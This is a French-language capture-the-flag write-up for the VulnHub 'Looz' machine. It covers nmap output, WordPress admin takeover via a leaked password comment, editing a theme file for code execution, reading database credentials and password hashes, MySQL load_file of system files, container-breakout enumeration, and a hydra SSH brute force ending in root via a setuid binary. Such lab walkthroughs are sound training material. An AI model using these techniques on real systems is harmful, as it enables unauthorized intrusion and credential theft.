---
title: "Solution du CTF Looz de VulnHub"
tags: [CTF, VulnHub]
---

[Looz](https://vulnhub.com/entry/looz-1,732/) est un CTF publié en aout 2021 sur *VulnHub*. Il est assez simple, mais la présence de nombreux comptes inutiles peuvent mener à une perte de temps énorme (TL;DR: concentrez-vous sur le compte `gandalf`).

Aussi la solution technique employée sur le CTF laisse supposer tout un cheminement d'exploitation qui n'existe pourtant pas. Une configuration plus classique aurait certainement rendu le CTF plus agréable.

## La Looz

```
Nmap scan report for 192.168.56.194
Host is up (0.00039s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
80/tcp   open   http         nginx 1.18.0 (Ubuntu)
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.securityfocus.com/bid/49303
|_      https://www.tenable.com/plugins/nessus/55976
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.194
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.194:80/
|     Form id: name-30a4
|_    Form action: #
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: nginx/1.18.0 (Ubuntu)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
3306/tcp open   mysql        MySQL 5.5.5-10.5.10-MariaDB-1:10.5.10+maria~focal
| vulners: 
|   MySQL 5.5.5-10.5.10-MariaDB-1:10.5.10+maria~focal: 
|_      NODEJS:602      0.0     https://vulners.com/nodejs/NODEJS:602
8081/tcp open   http         Apache httpd 2.4.38
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
--- snip ---
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
```

On a deux serveurs web, l'un sur le port 80 et l'autre sur le port 8081, les deux semblent retourner le même contenu.

On a cependant un Nginx sur l'un et un Apache sur l'autre ce qui laisse supposer un routage du type `proxy_pass`.

Le site sert un Wordpress configuré pour le nom d'hôte `wp.looz.com`.

Dans tous les cas je remarque ce commentaire en bas de page :

```html
    <!--- john don't forget to remove this comment, for now wp password is  y0uC@n'tbr3akIT--->
```

Il permet en effet de se connecter sur la page d'administration du Wordpress. On peut alors via l'éditeur de thèmes modifier le fichier `404.php` du theme `twentytwenty` et ainsi obtenir notre RCE.

## We need to go deeper

Dès la récupération du shell je remarque un hostname étrange (`a5610f5f2480`) et la présence d'un fichier `.dockerenv` à la racine.

Le fichier de configuration du Wordpress va chercher les identifiants via l'environnement ce qui doit être une astuce d'une image Docker officielle :

```php
// a helper function to lookup "env_FILE", "env", then fallback
if (!function_exists('getenv_docker')) {
        // https://github.com/docker-library/wordpress/issues/588 (WP-CLI will load this file 2x)
        function getenv_docker($env, $default) {
                if ($fileEnv = getenv($env . '_FILE')) {
                        return rtrim(file_get_contents($fileEnv), "\r\n");
                }
                else if (($val = getenv($env)) !== false) {
                        return $val;
                }
                else {
                        return $default;
                }
        }
}

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', getenv_docker('WORDPRESS_DB_NAME', 'wordpress') );

/** MySQL database username */
define( 'DB_USER', getenv_docker('WORDPRESS_DB_USER', 'example username') );

/** MySQL database password */
define( 'DB_PASSWORD', getenv_docker('WORDPRESS_DB_PASSWORD', 'example password') );

/**
 * Docker image fallback values above are sourced from the official WordPress installation wizard:
 * https://github.com/WordPress/WordPress/blob/f9cc35ebad82753e9c86de322ea5c76a9001c7e2/wp-admin/setup-config.php#L216-L230
 * (However, using "example username" and "example password" in your database is strongly discouraged.  Please use strong, random credentials!)
 */

/** MySQL hostname */
define( 'DB_HOST', getenv_docker('WORDPRESS_DB_HOST', 'mysql') );

```

Quand on est dans le shell on ne voit pas les variables en question :

```console
www-data@a5610f5f2480:/var/www/html$ env
PWD=/var/www/html
TERM=xterm-256color
SHLVL=1
_=/usr/bin/env
OLDPWD=/var/www/html/wp-content
```

Seul le process Apache doit pouvoir les voir. J'ai donc créé un script PHP pour afficher le `phpinfo()`. Là je pouvais voir les variables d'environnement qui m'intéressaient :

```
WORDPRESS_DB_NAME	wpdb
WORDPRESS_DB_USER	dbadmin
WORDPRESS_DB_PASSWORD	Ba2k3t
MYSQL_ENV_MYSQL_ROOT_PASSWORD	root-password
MYSQL_PORT_3306_TCP_ADDR	172.17.0.2
```

J'ai extrait les hashes de la DB grace à aux identifiants :

```
MariaDB [wpdb]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+--------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url           | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+--------------------+---------------------+---------------------+-------------+--------------+
|  1 | john       | $P$B7CI2MiUu8APqQ2PO5yOCBVR9BuCIy. | john          | john@looz.com    | http://wp.looz.com | 2021-06-07 08:08:50 |                     |           0 | john         |
|  2 | william    | $P$Bn2/UkbAmUUOXzTm0ZVwx976yuVk1y1 | william       | william@looz.com |                    | 2021-06-07 11:23:07 |                     |           0 | William      |
|  3 | james      | $P$Bi0Yc8ROkGWja3QnxP85VCGdsL6P4r/ | james         | james@looz.com   |                    | 2021-06-07 11:26:00 |                     |           0 | James        |
|  4 | Evelyn     | $P$BbDP0k/c8yEyb3GFYUz0dWP1WC9Eut. | evelyn        | evelyn@looz.com  |                    | 2021-06-07 11:28:11 |                     |           0 | Evelyn       |
|  5 | Mason      | $P$Bz3vDbHtvMZY89mmi7gQbpYoX7yTvo1 | mason         | mason@looz.com   |                    | 2021-06-07 11:28:51 |                     |           0 | Mason        |
|  6 | harper     | $P$B1fSDnkIVz0Ocn8TcPMxUWZF/7BZkv1 | harper        | harper@looz.com  |                    | 2021-06-07 11:29:31 |                     |           0 | Harper       |
|  8 | gandalf    | $P$BGOXSxRtzMKFKkRZ246loTIXH5AFQm/ | gandalf       | gandalf@looz.com |                    | 2021-06-07 11:46:28 |                     |           0 | Gandalf      |
+----+------------+------------------------------------+---------------+------------------+--------------------+---------------------+---------------------+-------------+--------------+
7 rows in set (0,001 sec)
```

Le mot de passe de `gandalf` se casse rapidement : `loveme2`

On peut aussi profiter du mot de passe pour le compte root de MySQL (`root-password`) pour charger des fichiers :

```
MariaDB [mysql]> select load_file("/etc/hostname");
+----------------------------+
| load_file("/etc/hostname") |
+----------------------------+
| a9400b1a26c0               |
+----------------------------+
1 row in set (0,002 sec)
```

On voit que le MySQL est dans un autre container. Je n'ai pas pu lire le contenu de `/etc/shadow` donc je suppose que le process ne tourne pas en root.

`LinPEAS` indiquait une éventuelle possibilité d'escalade (toujours dans le container web) :

```console
╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
═╣ Container ID ................... a5610f5f2480═╣ Container Full ID .............. a5610f5f24807722a624537cf129b03390e93e10afe0bc9aceb09eaebf973154
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled
═╣ Vulnerable to CVE-2019-5021 .... No

══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ release_agent breakout 1........ Yes
═╣ release_agent breakout 2........ No
═╣ core_pattern breakout .......... No
═╣ binfmt_misc breakout ........... No
═╣ uevent_helper breakout ......... No
═╣ core_pattern breakout .......... No
═╣ is modprobe present ............ No
═╣ DoS via panic_on_oom ........... No
═╣ DoS via panic_sys_fs ........... No
═╣ DoS via sysreq_trigger_dos ..... No
═╣ /proc/config.gz readable ....... No
═╣ /proc/sched_debug readable ..... Yes
═╣ /proc/*/mountinfo readable ..... No
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No
```

Je me suis tourné à nouveau vers [GitHub - cdk-team/CDK: 📦 Make security testing of K8s, Docker, and Containerd easier.](https://github.com/cdk-team/CDK) pour l'exploitation, mais le container ne fonctionne pas en mode privilégié et je ne suis pas root dedans.

C'est toutefois un outil très pratique, car il inclut différents outils qui manquent généralement dans un container, par exemple un scan de port :

```console
www-data@a5610f5f2480:/var/www/html$ ./cdk_linux_amd64 probe 172.17.0.1 1-65535 50 2000
2023/05/09 12:56:05 scanning 172.17.0.1 with user-defined ports, max parallels:50, timeout:2s
open : 172.17.0.1:22
open : 172.17.0.1:80
open : 172.17.0.1:3306
2023/05/09 13:39:50 scanning use time:2624923ms
2023/05/09 13:39:50 ending; @args is ips: 172.17.0.1, max parallels:50, timeout:2s
```

## We need to go the opposite of deeper

Vu qu'aucun des mots de passe qu'on a croisé jusque-là ne fonctionne pour l'un des 7 comptes utilisateurs trouvés, quelle est la prochaine étape ?

Lancer une attaque brute force avec `rockyou` sur les 7 comptes et attendre plus de 8000 heures ?

J'ai préféré chercher une solution sur le web et effectivement il fallait bruteforcer le compte de `gandalf`.

Après un temps bien trop long on finissait par trouver le mot de passe `highschoolmusical`.

```console
$ hydra -l gandalf -P wordlists/rockyou.txt ssh://192.168.56.194
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-09 12:22:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344381 login tries (l:1/p:14344381), ~896524 tries per task
[DATA] attacking ssh://192.168.56.194:22/
[STATUS] 123.00 tries/min, 123 tries in 00:01h, 14344262 to do in 1943:41h, 12 active
[STATUS] 85.33 tries/min, 256 tries in 00:03h, 14344129 to do in 2801:36h, 12 active
[STATUS] 79.43 tries/min, 556 tries in 00:07h, 14343829 to do in 3009:48h, 12 active
[STATUS] 79.73 tries/min, 1196 tries in 00:15h, 14343189 to do in 2998:10h, 12 active
[STATUS] 77.94 tries/min, 2416 tries in 00:31h, 14341969 to do in 3067:04h, 12 active
[STATUS] 77.83 tries/min, 3658 tries in 00:47h, 14340727 to do in 3070:58h, 12 active
[STATUS] 77.40 tries/min, 4876 tries in 01:03h, 14339509 to do in 3087:53h, 12 active
[STATUS] 77.14 tries/min, 6094 tries in 01:19h, 14338291 to do in 3097:56h, 12 active
[22][ssh] host: 192.168.56.194   login: gandalf   password: highschoolmusical
1 of 1 target successfully completed, 1 valid password found
```

On remarquait alors un autre utilisateur :

```console
gandalf@looz:~$ id alatar
uid=1000(alatar) gid=1000(alatar) groups=1000(alatar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

Ce dernier a un binaire setuid dans son dossier personnel :

```
   286419     20 -rwsr-xr-x   1 root     root          16848 Jun  7  2021 /home/alatar/Private/shell_testv1.0
```

Il suffisait alors de la lancer.

```console
gandalf@looz:/home/alatar/Private$ ./shell_testv1.0 
root@looz:/home/alatar/Private# id
uid=0(root) gid=0(root) groups=0(root),1001(gandalf)
root@looz:/home/alatar/Private# cd /root
root@looz:/root# ls
root.txt  rundocker.sh  snap
root@looz:/root# cat root.txt
ab17850978e36aaf6a2b8808f1ded971
```

Au final, je trouve stupide que l'auteur du CTF n'ai pas utilisé le mot de passe `loveme2` du wordpress pour le compte Unix, ça aurait rendu le CTF bien plus logique.

Au mieux, il aurait dû ne pas ajouter plein de comptes inutiles qui donnent trop de cheminements possibles.

Quant à la piste des containers elle ne menait nulle part. Par exemple sur le container mysql le processus ne tournait effectivement pas en root :

```console
root@looz:~# docker ps
CONTAINER ID   IMAGE       COMMAND                  CREATED         STATUS        PORTS                                       NAMES
a5610f5f2480   wordpress   "docker-entrypoint.s…"   23 months ago   Up 16 hours   0.0.0.0:8081->80/tcp, :::8081->80/tcp       wpcontainer
a9400b1a26c0   mariadb     "docker-entrypoint.s…"   23 months ago   Up 16 hours   0.0.0.0:3306->3306/tcp, :::3306->3306/tcp   wordpressdb
root@looz:~# docker exec -it a9400b1a26c0 /bin/bash
root@a9400b1a26c0:/# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
mysql          1  0.3  7.9 1087896 79848 pts/0   Ssl+ May08   3:49 mysqld
root        1402  1.5  0.3   4240  3240 pts/1    Ss   12:43   0:00 /bin/bash
root        1410  0.0  0.2   5896  2764 pts/1    R+   12:43   0:00 ps aux
```

Les deux images utilisées semblent complètement stock.
